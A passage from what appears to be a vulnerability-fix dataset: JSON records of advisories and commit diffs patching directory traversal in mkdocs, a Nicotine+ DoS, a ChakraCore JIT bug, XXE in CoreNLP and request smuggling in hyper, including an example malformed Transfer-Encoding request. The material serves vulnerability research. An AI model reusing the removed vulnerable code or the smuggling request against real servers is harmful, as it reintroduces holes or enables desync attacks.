            "patch_content":"From cddc453c9d49298e60e7d56fb71130c151cbcbe5 Mon Sep 17 00:00:00 2001\nFrom: Oleh Prypin <oleh@pryp.in>\nDate: Sun, 10 Oct 2021 10:52:05 +0200\nSubject: [PATCH] Prevent directory traversal in the dev server\n\n---\n mkdocs\/livereload\/__init__.py | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\ndiff --git a\/mkdocs\/livereload\/__init__.py b\/mkdocs\/livereload\/__init__.py\nindex c9f7afa8e7..998022de7e 100644\n--- a\/mkdocs\/livereload\/__init__.py\n+++ b\/mkdocs\/livereload\/__init__.py\n@@ -4,6 +4,7 @@\n import mimetypes\n import os\n import os.path\n+import posixpath\n import re\n import socketserver\n import threading\n@@ -183,9 +184,11 @@ def condition():\n         if path == \"\/js\/livereload.js\":\n             file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), \"livereload.js\")\n         elif path.startswith(self.mount_path):\n-            rel_file_path = path[len(self.mount_path):].lstrip(\"\/\")\n+            rel_file_path = path[len(self.mount_path):]\n             if path.endswith(\"\/\"):\n                 rel_file_path += \"index.html\"\n+            # Prevent directory traversal - normalize the path.\n+            rel_file_path = posixpath.normpath(\"\/\" + rel_file_path).lstrip(\"\/\")\n             file_path = os.path.join(self.root, rel_file_path)\n         elif path == \"\/\":\n             start_response(\"302 Found\", [(\"Location\", self.mount_path)])",
            "code_diff":"@@ -4,6 +4,7 @@\n import mimetypes\n import os\n import os.path\n+import posixpath\n import re\n import socketserver\n import threading\n@@ -183,9 +184,11 @@ def condition():\n         if path == \"\/js\/livereload.js\":\n             file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), \"livereload.js\")\n         elif path.startswith(self.mount_path):\n-            rel_file_path = path[len(self.mount_path):].lstrip(\"\/\")\n+            rel_file_path = path[len(self.mount_path):]\n             if path.endswith(\"\/\"):\n                 rel_file_path += \"index.html\"\n+            # Prevent directory traversal - normalize the path.\n+            rel_file_path = posixpath.normpath(\"\/\" + rel_file_path).lstrip(\"\/\")\n             file_path = os.path.join(self.root, rel_file_path)\n         elif path == \"\/\":\n             start_response(\"302 Found\", [(\"Location\", self.mount_path)])"
        },
        {
            "index":524,
            "vuln_id":"GHSA-p4v2-r99v-wjc2",
            "cwe_id":"{'CWE-116'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/nicotine-plus\/nicotine-plus\/commit\/0e3e2fac27a518f0a84330f1ddf1193424522045'}",
            "dataset":"osv",
            "summary":"Improper Encoding or Escaping of Output in Nicotine+ Denial of service (DoS) vulnerability in Nicotine+ starting with version 3.0.3 and prior to version 3.2.1 allows a user with a modified Soulseek client to crash Nicotine+ by sending a file download request with a file path containing a null character.",
            "published_date":"2022-03-16",
            "chain_len":1,
            "project":"https:\/\/github.com\/nicotine-plus\/nicotine-plus",
            "commit_href":"https:\/\/github.com\/nicotine-plus\/nicotine-plus\/commit\/0e3e2fac27a518f0a84330f1ddf1193424522045",
            "commit_sha":"0e3e2fac27a518f0a84330f1ddf1193424522045",
            "patch":"SINGLE",
            "chain_ord":"['0e3e2fac27a518f0a84330f1ddf1193424522045']",
            "before_first_fix_commit":"{'aabfa856bd57bcf986c2ea296457986e83c0c98b'}",
            "last_fix_commit":"0e3e2fac27a518f0a84330f1ddf1193424522045",
            "chain_ord_pos":1.0,
            "commit_datetime":"12\/22\/2021, 18:49:21",
            "message":"Handle invalid file paths in file download requests\n\nFixes #1777",
            "author":"mathiascode",
            "comments":null,
            "stats":"{'additions': 13, 'deletions': 4, 'total': 17}",
            "files":"{'pynicotine\/shares.py': {'additions': 13, 'deletions': 4, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nicotine-plus\/nicotine-plus\/raw\/0e3e2fac27a518f0a84330f1ddf1193424522045\/pynicotine%2Fshares.py', 'patch': '@@ -609,13 +609,22 @@ def load_shares(cls, shares, dbs, reset_shares=False):\\n \\n     def file_is_shared(self, user, virtualfilename, realfilename):\\n \\n-        log.add_transfer(\"Checking if file %(virtual_name)s with real path %(path)s is shared\", {\\n+        log.add_transfer(\"Checking if file is shared: %(virtual_name)s with real path %(path)s\", {\\n             \"virtual_name\": virtualfilename,\\n             \"path\": realfilename\\n         })\\n \\n-        if not os.access(realfilename, os.R_OK):\\n-            log.add_transfer(\"Can\\'t access file %(virtual_name)s with real path %(path)s, not sharing\", {\\n+        try:\\n+            if not os.access(realfilename, os.R_OK):\\n+                log.add_transfer(\"Cannot access file, not sharing: %(virtual_name)s with real path %(path)s\", {\\n+                    \"virtual_name\": virtualfilename,\\n+                    \"path\": realfilename\\n+                })\\n+                return False\\n+\\n+        except Exception:\\n+            log.add_transfer((\"Requested file path contains invalid characters or other errors, not sharing: \"\\n+                              \"%(virtual_name)s with real path %(path)s\"), {\\n                 \"virtual_name\": virtualfilename,\\n                 \"path\": realfilename\\n             })\\n@@ -643,7 +652,7 @@ def file_is_shared(self, user, virtualfilename, realfilename):\\n                 if file == fileinfo[0]:\\n                     return True\\n \\n-        log.add_transfer(\"Failed to share file %(virtual_name)s with real path %(path)s, since it wasn\\'t found\", {\\n+        log.add_transfer(\"Failed to share file, since it wasn\\'t found: %(virtual_name)s with real path %(path)s\", {\\n             \"virtual_name\": virtualfilename,\\n             \"path\": realfilename\\n         })'}}",
            "message_norm":"handle invalid file paths in file download requests\n\nfixes #1777",
            "language":"en",
            "entities":"[('fixes', 'ACTION', ''), ('#1777', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['pynicotine\/shares.py'])",
            "num_files":1.0,
            "patch_content":"From 0e3e2fac27a518f0a84330f1ddf1193424522045 Mon Sep 17 00:00:00 2001\nFrom: mathiascode <mail@mathias.is>\nDate: Wed, 22 Dec 2021 20:49:21 +0200\nSubject: [PATCH] Handle invalid file paths in file download requests\n\nFixes #1777\n---\n pynicotine\/shares.py | 17 +++++++++++++----\n 1 file changed, 13 insertions(+), 4 deletions(-)\n\ndiff --git a\/pynicotine\/shares.py b\/pynicotine\/shares.py\nindex 94c98e93fc6a..1d836d99252d 100644\n--- a\/pynicotine\/shares.py\n+++ b\/pynicotine\/shares.py\n@@ -609,13 +609,22 @@ def load_shares(cls, shares, dbs, reset_shares=False):\n \n     def file_is_shared(self, user, virtualfilename, realfilename):\n \n-        log.add_transfer(\"Checking if file %(virtual_name)s with real path %(path)s is shared\", {\n+        log.add_transfer(\"Checking if file is shared: %(virtual_name)s with real path %(path)s\", {\n             \"virtual_name\": virtualfilename,\n             \"path\": realfilename\n         })\n \n-        if not os.access(realfilename, os.R_OK):\n-            log.add_transfer(\"Can't access file %(virtual_name)s with real path %(path)s, not sharing\", {\n+        try:\n+            if not os.access(realfilename, os.R_OK):\n+                log.add_transfer(\"Cannot access file, not sharing: %(virtual_name)s with real path %(path)s\", {\n+                    \"virtual_name\": virtualfilename,\n+                    \"path\": realfilename\n+                })\n+                return False\n+\n+        except Exception:\n+            log.add_transfer((\"Requested file path contains invalid characters or other errors, not sharing: \"\n+                              \"%(virtual_name)s with real path %(path)s\"), {\n                 \"virtual_name\": virtualfilename,\n                 \"path\": realfilename\n             })\n@@ -643,7 +652,7 @@ def file_is_shared(self, user, virtualfilename, realfilename):\n                 if file == fileinfo[0]:\n                     return True\n \n-        log.add_transfer(\"Failed to share file %(virtual_name)s with real path %(path)s, since it wasn't found\", {\n+        log.add_transfer(\"Failed to share file, since it wasn't found: %(virtual_name)s with real path %(path)s\", {\n             \"virtual_name\": virtualfilename,\n             \"path\": realfilename\n         })",
            "code_diff":"@@ -609,13 +609,22 @@ def load_shares(cls, shares, dbs, reset_shares=False):\n \n     def file_is_shared(self, user, virtualfilename, realfilename):\n \n-        log.add_transfer(\"Checking if file %(virtual_name)s with real path %(path)s is shared\", {\n+        log.add_transfer(\"Checking if file is shared: %(virtual_name)s with real path %(path)s\", {\n             \"virtual_name\": virtualfilename,\n             \"path\": realfilename\n         })\n \n-        if not os.access(realfilename, os.R_OK):\n-            log.add_transfer(\"Can't access file %(virtual_name)s with real path %(path)s, not sharing\", {\n+        try:\n+            if not os.access(realfilename, os.R_OK):\n+                log.add_transfer(\"Cannot access file, not sharing: %(virtual_name)s with real path %(path)s\", {\n+                    \"virtual_name\": virtualfilename,\n+                    \"path\": realfilename\n+                })\n+                return False\n+\n+        except Exception:\n+            log.add_transfer((\"Requested file path contains invalid characters or other errors, not sharing: \"\n+                              \"%(virtual_name)s with real path %(path)s\"), {\n                 \"virtual_name\": virtualfilename,\n                 \"path\": realfilename\n             })\n@@ -643,7 +652,7 @@ def file_is_shared(self, user, virtualfilename, realfilename):\n                 if file == fileinfo[0]:\n                     return True\n \n-        log.add_transfer(\"Failed to share file %(virtual_name)s with real path %(path)s, since it wasn't found\", {\n+        log.add_transfer(\"Failed to share file, since it wasn't found: %(virtual_name)s with real path %(path)s\", {\n             \"virtual_name\": virtualfilename,\n             \"path\": realfilename\n         })"
        },
        {
            "index":183,
            "vuln_id":"GHSA-v89p-5hr2-4rh4",
            "cwe_id":"{'CWE-787'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/6b1250b6ffea7006226dd937e52cf5b353fcfc15', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb'}",
            "dataset":"osv",
            "summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1131, CVE-2019-1139, CVE-2019-1140, CVE-2019-1141, CVE-2019-1195, CVE-2019-1196.",
            "published_date":"2021-03-29",
            "chain_len":2,
            "project":"https:\/\/github.com\/chakra-core\/ChakraCore",
            "commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb",
            "commit_sha":"bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb",
            "patch":"MULTI",
            "chain_ord":"['bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb', '6b1250b6ffea7006226dd937e52cf5b353fcfc15']",
            "before_first_fix_commit":"{'75162b7f2d8ac2b37d17564e9c979ba1bae707e8', '450a349fda1b153d758a9e01698b977e60870e4c'}",
            "last_fix_commit":"6b1250b6ffea7006226dd937e52cf5b353fcfc15",
            "chain_ord_pos":1.0,
            "commit_datetime":"07\/02\/2019, 19:08:32",
            "message":"[CVE-2019-1197] Chakra JIT Type Confusion",
            "author":"Michael Holman",
            "comments":null,
            "stats":"{'additions': 11, 'deletions': 4, 'total': 15}",
            "files":"{'lib\/Backend\/GlobOptIntBounds.cpp': {'additions': 11, 'deletions': 4, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb\/lib%2FBackend%2FGlobOptIntBounds.cpp', 'patch': '@@ -1278,13 +1278,20 @@ GlobOpt::InvalidateInductionVariables(IR::Instr * instr)\\n     }\\n \\n     \/\/ If this is an induction variable, then treat it the way the prepass would have if it had seen\\n-    \/\/ the assignment and the resulting change to the value number, and mark it as indeterminate.\\n+    \/\/ the assignment and the resulting change to the value number, and mark induction variables\\n+    \/\/ for the loop as indeterminate.\\n+    \/\/ We need to invalidate all induction variables for the loop, because we might have used the\\n+    \/\/ invalidated induction variable to calculate the loopCount, and this now invalid loopCount\\n+    \/\/ also impacts bound checks for secondary induction variables\\n     for (Loop * loop = this->currentBlock->loop; loop; loop = loop->parent)\\n     {\\n-        InductionVariable *iv = nullptr;\\n-        if (loop->inductionVariables && loop->inductionVariables->TryGetReference(dstSym->m_id, &iv))\\n+        if (loop->inductionVariables && loop->inductionVariables->ContainsKey(dstSym->m_id))\\n         {\\n-            iv->SetChangeIsIndeterminate();\\n+            for (auto it = loop->inductionVariables->GetIterator(); it.IsValid(); it.MoveNext())\\n+            {\\n+                InductionVariable& inductionVariable = it.CurrentValueReference();\\n+                inductionVariable.SetChangeIsIndeterminate();\\n+            }\\n         }\\n     }\\n }'}}",
            "message_norm":"[cve-2019-1197] chakra jit type confusion",
            "language":"en",
            "entities":"[('cve-2019-1197', 'VULNID', 'CVE'), ('type confusion', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/Backend\/GlobOptIntBounds.cpp'])",
            "num_files":1.0,
            "patch_content":"From bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb Mon Sep 17 00:00:00 2001\nFrom: Michael Holman <michhol@microsoft.com>\nDate: Tue, 2 Jul 2019 12:08:32 -0700\nSubject: [PATCH] [CVE-2019-1197] Chakra JIT Type Confusion\n\n---\n lib\/Backend\/GlobOptIntBounds.cpp | 15 +++++++++++----\n 1 file changed, 11 insertions(+), 4 deletions(-)\n\ndiff --git a\/lib\/Backend\/GlobOptIntBounds.cpp b\/lib\/Backend\/GlobOptIntBounds.cpp\nindex 5821aed6452..8e5edc30508 100644\n--- a\/lib\/Backend\/GlobOptIntBounds.cpp\n+++ b\/lib\/Backend\/GlobOptIntBounds.cpp\n@@ -1278,13 +1278,20 @@ GlobOpt::InvalidateInductionVariables(IR::Instr * instr)\n     }\n \n     \/\/ If this is an induction variable, then treat it the way the prepass would have if it had seen\n-    \/\/ the assignment and the resulting change to the value number, and mark it as indeterminate.\n+    \/\/ the assignment and the resulting change to the value number, and mark induction variables\n+    \/\/ for the loop as indeterminate.\n+    \/\/ We need to invalidate all induction variables for the loop, because we might have used the\n+    \/\/ invalidated induction variable to calculate the loopCount, and this now invalid loopCount\n+    \/\/ also impacts bound checks for secondary induction variables\n     for (Loop * loop = this->currentBlock->loop; loop; loop = loop->parent)\n     {\n-        InductionVariable *iv = nullptr;\n-        if (loop->inductionVariables && loop->inductionVariables->TryGetReference(dstSym->m_id, &iv))\n+        if (loop->inductionVariables && loop->inductionVariables->ContainsKey(dstSym->m_id))\n         {\n-            iv->SetChangeIsIndeterminate();\n+            for (auto it = loop->inductionVariables->GetIterator(); it.IsValid(); it.MoveNext())\n+            {\n+                InductionVariable& inductionVariable = it.CurrentValueReference();\n+                inductionVariable.SetChangeIsIndeterminate();\n+            }\n         }\n     }\n }",
            "code_diff":"@@ -1278,13 +1278,20 @@ GlobOpt::InvalidateInductionVariables(IR::Instr * instr)\n     }\n \n     \/\/ If this is an induction variable, then treat it the way the prepass would have if it had seen\n-    \/\/ the assignment and the resulting change to the value number, and mark it as indeterminate.\n+    \/\/ the assignment and the resulting change to the value number, and mark induction variables\n+    \/\/ for the loop as indeterminate.\n+    \/\/ We need to invalidate all induction variables for the loop, because we might have used the\n+    \/\/ invalidated induction variable to calculate the loopCount, and this now invalid loopCount\n+    \/\/ also impacts bound checks for secondary induction variables\n     for (Loop * loop = this->currentBlock->loop; loop; loop = loop->parent)\n     {\n-        InductionVariable *iv = nullptr;\n-        if (loop->inductionVariables && loop->inductionVariables->TryGetReference(dstSym->m_id, &iv))\n+        if (loop->inductionVariables && loop->inductionVariables->ContainsKey(dstSym->m_id))\n         {\n-            iv->SetChangeIsIndeterminate();\n+            for (auto it = loop->inductionVariables->GetIterator(); it.IsValid(); it.MoveNext())\n+            {\n+                InductionVariable& inductionVariable = it.CurrentValueReference();\n+                inductionVariable.SetChangeIsIndeterminate();\n+            }\n         }\n     }\n }"
        },
        {
            "index":518,
            "vuln_id":"GHSA-mh83-jcw5-rjh8",
            "cwe_id":"{'CWE-611'}",
            "score":6.1,
            "chain":"{'https:\/\/github.com\/stanfordnlp\/corenlp\/commit\/1f52136321cfca68b991bd7870563d06cf96624d'}",
            "dataset":"osv",
            "summary":"XML External Entity Reference in edu.stanford.nlp:stanford-corenlp The TransformXML() function makes use of SAXParser generated from a SAXParserFactory with no FEATURE_SECURE_PROCESSING set, allowing for XXE attacks.",
            "published_date":"2022-01-14",
            "chain_len":1,
            "project":"https:\/\/github.com\/stanfordnlp\/corenlp",
            "commit_href":"https:\/\/github.com\/stanfordnlp\/corenlp\/commit\/1f52136321cfca68b991bd7870563d06cf96624d",
            "commit_sha":"1f52136321cfca68b991bd7870563d06cf96624d",
            "patch":"SINGLE",
            "chain_ord":"['1f52136321cfca68b991bd7870563d06cf96624d']",
            "before_first_fix_commit":"{'76666dd1d1697177585bbc618c21faf998028509'}",
            "last_fix_commit":"1f52136321cfca68b991bd7870563d06cf96624d",
            "chain_ord_pos":1.0,
            "commit_datetime":"01\/12\/2022, 07:13:08",
            "message":"Fix SAXParser security issue",
            "author":"Haxatron",
            "comments":null,
            "stats":"{'additions': 3, 'deletions': 0, 'total': 3}",
            "files":"{'src\/edu\/stanford\/nlp\/process\/TransformXML.java': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/stanfordnlp\/CoreNLP\/raw\/1f52136321cfca68b991bd7870563d06cf96624d\/src%2Fedu%2Fstanford%2Fnlp%2Fprocess%2FTransformXML.java', 'patch': '@@ -5,6 +5,7 @@\\n import java.io.*;\\n import java.util.*;\\n \\n+import javax.xml.XMLConstants;\\n import javax.xml.parsers.SAXParser;\\n import javax.xml.parsers.SAXParserFactory;\\n \\n@@ -195,6 +196,8 @@ public void processText(String text) {\\n \\n   public TransformXML() {\\n     try {\\n+      SAXParserFactory spf = SAXParserFactory.newInstance();\\n+      spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\\n       saxParser = SAXParserFactory.newInstance().newSAXParser();\\n     } catch (Exception e) {\\n       log.info(\"Error configuring XML parser: \" + e);'}}",
            "message_norm":"fix saxparser security issue",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/edu\/stanford\/nlp\/process\/TransformXML.java'])",
            "num_files":1.0,
            "patch_content":"From 1f52136321cfca68b991bd7870563d06cf96624d Mon Sep 17 00:00:00 2001\nFrom: Haxatron <haxatron1@gmail.com>\nDate: Tue, 11 Jan 2022 23:13:08 -0800\nSubject: [PATCH] Fix SAXParser security issue\n\n---\n src\/edu\/stanford\/nlp\/process\/TransformXML.java | 3 +++\n 1 file changed, 3 insertions(+)\n\ndiff --git a\/src\/edu\/stanford\/nlp\/process\/TransformXML.java b\/src\/edu\/stanford\/nlp\/process\/TransformXML.java\nindex 5489551d35..a4b565d3e7 100644\n--- a\/src\/edu\/stanford\/nlp\/process\/TransformXML.java\n+++ b\/src\/edu\/stanford\/nlp\/process\/TransformXML.java\n@@ -5,6 +5,7 @@\n import java.io.*;\n import java.util.*;\n \n+import javax.xml.XMLConstants;\n import javax.xml.parsers.SAXParser;\n import javax.xml.parsers.SAXParserFactory;\n \n@@ -195,6 +196,8 @@ public void processText(String text) {\n \n   public TransformXML() {\n     try {\n+      SAXParserFactory spf = SAXParserFactory.newInstance();\n+      spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n       saxParser = SAXParserFactory.newInstance().newSAXParser();\n     } catch (Exception e) {\n       log.info(\"Error configuring XML parser: \" + e);",
            "code_diff":"@@ -5,6 +5,7 @@\n import java.io.*;\n import java.util.*;\n \n+import javax.xml.XMLConstants;\n import javax.xml.parsers.SAXParser;\n import javax.xml.parsers.SAXParserFactory;\n \n@@ -195,6 +196,8 @@ public void processText(String text) {\n \n   public TransformXML() {\n     try {\n+      SAXParserFactory spf = SAXParserFactory.newInstance();\n+      spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n       saxParser = SAXParserFactory.newInstance().newSAXParser();\n     } catch (Exception e) {\n       log.info(\"Error configuring XML parser: \" + e);"
        },
        {
            "index":458,
            "vuln_id":"GHSA-6hfq-h8hq-87mf",
            "cwe_id":"{'CWE-444'}",
            "score":4.8,
            "chain":"{'https:\/\/github.com\/hyperium\/hyper\/commit\/8f93123efef5c1361086688fe4f34c83c89cec02'}",
            "dataset":"osv",
            "summary":"HTTP Request Smuggling in hyper ### Summary\n\nhyper's HTTP server code had a flaw that incorrectly understands some requests with multiple transfer-encoding headers to have a chunked payload, when it should have been rejected as illegal. This combined with an upstream HTTP proxy that understands the request payload boundary differently can result in \"request smuggling\" or \"desync attacks\".\n\n### Vulnerability\n\nThe flaw was introduced in https:\/\/github.com\/hyperium\/hyper\/commit\/26417fc24a7d05df538e0f39239b373c5c3d61f6, released in v0.12.0.\n\nConsider this example request:\n\n```\nPOST \/yolo HTTP\/1.1\nTransfer-Encoding: chunked\nTransfer-Encoding: cow\n```\n\nThis request *should* be rejected, according to RFC 7230, since it has a `Transfer-Encoding` header, but after folding, it does not end in `chunked`. hyper would notice the `chunked` in the first line, and then check the second line, and thanks to a missing boolean assignment, *not* set the error condition. hyper would treat the payload as being `chunked`. By differing from the spec, it is possible to send requests like these to endpoints that have different HTTP implementations, with different interpretations of the payload semantics, and cause \"desync attacks\".\n\nThere are several parts of the spec that must also be checked, and hyper correctly handles all of those. Additionally, hyper's *client* does not allow sending requests with improper headers, so the misunderstanding cannot be propagated further.\n\nRead more about desync attacks: https:\/\/portswigger.net\/research\/http-desync-attacks-request-smuggling-reborn\n\n### Impact\n\nTo determine if vulnerable, all these things must be true:\n\n- **Using hyper as an HTTP *server*.** The client is not affected.\n- **Using HTTP\/1.1.** HTTP\/2 does not use `transfer-encoding`.\n- **Using a vulnerable HTTP proxy upstream to hyper.** If an upstream proxy correctly rejects the illegal transfer-encoding headers, the desync attack cannot succeed. If there is *no* proxy upstream of hyper, hyper cannot *start* the desync attack, as the client will repair the headers before forwarding.\n\n### Patches\n\nWe have released and backported the following patch versions:\n\n- v0.14.3\n- v0.13.10\n\n### Workarounds\n\nBesides upgrading hyper, you can take the following options:\n\n- Reject requests that contain a `transfer-encoding` header.\n- Ensure any upstream proxy handles `transfer-encoding` correctly.\n\n### Credits\n\nThis issue was initially reported by ZeddYu Lu From Qi An Xin Technology Research Institute.",
            "published_date":"2021-08-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/hyperium\/hyper",
            "commit_href":"https:\/\/github.com\/hyperium\/hyper\/commit\/8f93123efef5c1361086688fe4f34c83c89cec02",
            "commit_sha":"8f93123efef5c1361086688fe4f34c83c89cec02",
            "patch":"SINGLE",
            "chain_ord":"['8f93123efef5c1361086688fe4f34c83c89cec02']",
            "before_first_fix_commit":"{'4d2125c67c8087de863f74278a017c4caf37e6a9'}",
            "last_fix_commit":"8f93123efef5c1361086688fe4f34c83c89cec02",
            "chain_ord_pos":1.0,
            "commit_datetime":"02\/05\/2021, 21:27:30",
            "message":"fix(http1): fix server misinterpretting multiple Transfer-Encoding headers\n\nWhen a request arrived with multiple `Transfer-Encoding` headers, hyper\nwould check each if they ended with `chunked`. It should have only\nchecked if the *last* header ended with `chunked`.\n\nSee https:\/\/github.com\/hyperium\/hyper\/security\/advisories\/GHSA-6hfq-h8hq-87mf",
            "author":"Sean McArthur",
            "comments":null,
            "stats":"{'additions': 12, 'deletions': 0, 'total': 12}",
            "files":"{'src\/proto\/h1\/role.rs': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hyperium\/hyper\/raw\/8f93123efef5c1361086688fe4f34c83c89cec02\/src%2Fproto%2Fh1%2Frole.rs', 'patch': '@@ -213,6 +213,8 @@ impl Http1Transaction for Server {\\n                     if headers::is_chunked_(&value) {\\n                         is_te_chunked = true;\\n                         decoder = DecodedLength::CHUNKED;\\n+                    } else {\\n+                        is_te_chunked = false;\\n                     }\\n                 }\\n                 header::CONTENT_LENGTH => {\\n@@ -1444,6 +1446,16 @@ mod tests {\\n             \"transfer-encoding doesn\\'t end in chunked\",\\n         );\\n \\n+        parse_err(\\n+            \"\\\\\\n+             POST \/ HTTP\/1.1\\\\r\\\\n\\\\\\n+             transfer-encoding: chunked\\\\r\\\\n\\\\\\n+             transfer-encoding: afterlol\\\\r\\\\n\\\\\\n+             \\\\r\\\\n\\\\\\n+             \",\\n+            \"transfer-encoding multiple lines doesn\\'t end in chunked\",\\n+        );\\n+\\n         \/\/ http\/1.0\\n \\n         assert_eq!('}}",
            "message_norm":"fix(http1): fix server misinterpretting multiple transfer-encoding headers\n\nwhen a request arrived with multiple `transfer-encoding` headers, hyper\nwould check each if they ended with `chunked`. it should have only\nchecked if the *last* header ended with `chunked`.\n\nsee https:\/\/github.com\/hyperium\/hyper\/security\/advisories\/ghsa-6hfq-h8hq-87mf",
            "language":"en",
            "entities":"[('fix(http1', 'ACTION', ''), ('fix', 'ACTION', ''), ('server', 'SECWORD', ''), ('encoding', 'SECWORD', ''), ('encoding', 'SECWORD', ''), ('https:\/\/github.com\/hyperium\/hyper\/security\/advisories\/ghsa-6hfq-h8hq-87mf', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/proto\/h1\/role.rs'])",
            "num_files":1.0,
            "patch_content":"From 8f93123efef5c1361086688fe4f34c83c89cec02 Mon Sep 17 00:00:00 2001\nFrom: Sean McArthur <sean@seanmonstar.com>\nDate: Fri, 5 Feb 2021 13:27:30 -0800\nSubject: [PATCH] fix(http1): fix server misinterpretting multiple\n Transfer-Encoding headers\n\nWhen a request arrived with multiple `Transfer-Encoding` headers, hyper\nwould check each if they ended with `chunked`. It should have only\nchecked if the *last* header ended with `chunked`.\n\nSee https:\/\/github.com\/hyperium\/hyper\/security\/advisories\/GHSA-6hfq-h8hq-87mf\n---\n src\/proto\/h1\/role.rs | 12 ++++++++++++\n 1 file changed, 12 insertions(+)\n\ndiff --git a\/src\/proto\/h1\/role.rs b\/src\/proto\/h1\/role.rs\nindex 0c7eb1eecd..a9f2f0074f 100644\n--- a\/src\/proto\/h1\/role.rs\n+++ b\/src\/proto\/h1\/role.rs\n@@ -213,6 +213,8 @@ impl Http1Transaction for Server {\n                     if headers::is_chunked_(&value) {\n                         is_te_chunked = true;\n                         decoder = DecodedLength::CHUNKED;\n+                    } else {\n+                        is_te_chunked = false;\n                     }\n                 }\n                 header::CONTENT_LENGTH => {\n@@ -1444,6 +1446,16 @@ mod tests {\n             \"transfer-encoding doesn't end in chunked\",\n         );\n \n+        parse_err(\n+            \"\\\n+             POST \/ HTTP\/1.1\\r\\n\\\n+             transfer-encoding: chunked\\r\\n\\\n+             transfer-encoding: afterlol\\r\\n\\\n+             \\r\\n\\\n+             \",\n+            \"transfer-encoding multiple lines doesn't end in chunked\",\n+        );\n+\n         \/\/ http\/1.0\n \n         assert_eq!(",
            "code_diff":"@@ -213,6 +213,8 @@ impl Http1Transaction for Server {\n                     if headers::is_chunked_(&value) {\n                         is_te_chunked = true;\n                         decoder = DecodedLength::CHUNKED;\n+                    } else {\n+                        is_te_chunked = false;\n                     }\n                 }\n                 header::CONTENT_LENGTH => {\n@@ -1444,6 +1446,16 @@ mod tests {\n             \"transfer-encoding doesn't end in chunked\",\n         );\n \n+        parse_err(\n+            \"\\\n+             POST \/ HTTP\/1.1\\r\\n\\\n+             transfer-encoding: chunked\\r\\n\\\n+             transfer-encoding: afterlol\\r\\n\\\n+             \\r\\n\\\n+             \",\n+            \"transfer-encoding multiple lines doesn't end in chunked\",\n+        );\n+\n         \/\/ http\/1.0\n \n         assert_eq!("
        },
        {
            "index":860,
            "vuln_id":"GHSA-896r-f27r-55mw",
            "cwe_id":"{'CWE-1321', 'CWE-915'}",
            "score":9.8,
            "chain":"{'https:\/\/github.com\/kriszyp\/json-schema\/commit\/b62f1da1ff5442f23443d6be6a92d00e65cba93a', 'https:\/\/github.com\/kriszyp\/json-schema\/commit\/22f146111f541d9737e832823699ad3528ca7741', 'https:\/\/github.com\/kriszyp\/json-schema\/commit\/f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa'}",
            "dataset":"osv",
            "summary":"json-schema is vulnerable to Prototype Pollution json-schema before version 0.4.0 is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').",
            "published_date":"2021-11-19",
            "chain_len":3,
            "project":"https:\/\/github.com\/kriszyp\/json-schema",
            "commit_href":"https:\/\/github.com\/kriszyp\/json-schema\/commit\/b62f1da1ff5442f23443d6be6a92d00e65cba93a",
            "commit_sha":"b62f1da1ff5442f23443d6be6a92d00e65cba93a",
            "patch":"MULTI",
            "chain_ord":"['22f146111f541d9737e832823699ad3528ca7741', 'b62f1da1ff5442f23443d6be6a92d00e65cba93a', 'f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa']",
            "before_first_fix_commit":"{'ef60987a9a14b9d9c739384460044ba53cd9b9a2'}",
            "last_fix_commit":"f6f6a3b02d667aa4ba2d5d50cc19208c4462abfa",
            "chain_ord_pos":2.0,
            "commit_datetime":"11\/02\/2021, 02:41:46",
            "message":"Protect against constructor modification, #84",
            "author":"Kris Zyp",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
